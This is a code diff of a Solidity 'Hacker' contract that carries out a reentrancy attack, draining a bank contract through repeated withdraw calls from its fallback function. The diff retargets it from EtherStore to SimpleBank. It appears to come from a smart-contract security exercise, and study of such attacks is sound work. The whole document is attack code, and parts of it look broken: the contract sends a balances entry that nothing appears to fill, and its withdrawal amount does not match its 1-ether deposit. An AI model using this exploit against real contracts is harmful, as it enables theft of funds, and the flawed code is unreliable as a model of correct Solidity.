@@ -2,23 +2,29 @@
 
 pragma solidity ^0.8.0;
 
-contract Hacker {
-     EtherStore public etherStore;
+import "./SimpleBank.sol";
 
-    constructor(address _etherStoreAddress) {
-        etherStore = EtherStore(_etherStoreAddress);
+
+contract Hacker {
+    
+    SimpleBank public simpleBank;
+
+    mapping(address => uint256) public balances;
+
+    constructor(address _simpleBankAdrress) {
+        simpleBank = SimpleBank(_simpleBankAdrress);
     }
 
     fallback() external payable {
-        if (address(etherStore).balance >= 1 ether) {
-            etherStore.withdraw(1);
+        if (address(simpleBank).balance >= 1 ether) {
+            simpleBank.withdraw(1);
         }
     }
 
     function attack() external payable {
         require(msg.value >= 1 ether);
-        etherStore.deposit{value: 1 ether}();
-        etherStore.withdraw(1);
+        simpleBank.deposit{value: 1 ether}();
+        simpleBank.withdraw(1);
     }
 
     function getBalance() public view returns (uint) {
@@ -30,9 +36,9 @@ contract Hacker {
         
         uint256 bal  = balances[address(this)];
 
-        (bool sent, bytes calldata data) = msg.sender.call{value: bal}("");
+        (bool sent,) = msg.sender.call{value: bal}("");
 
-        require(sent, "Failed to send Ether")
+        require(sent, "Failed to send Ether");
         
         return balances[msg.sender];
     }
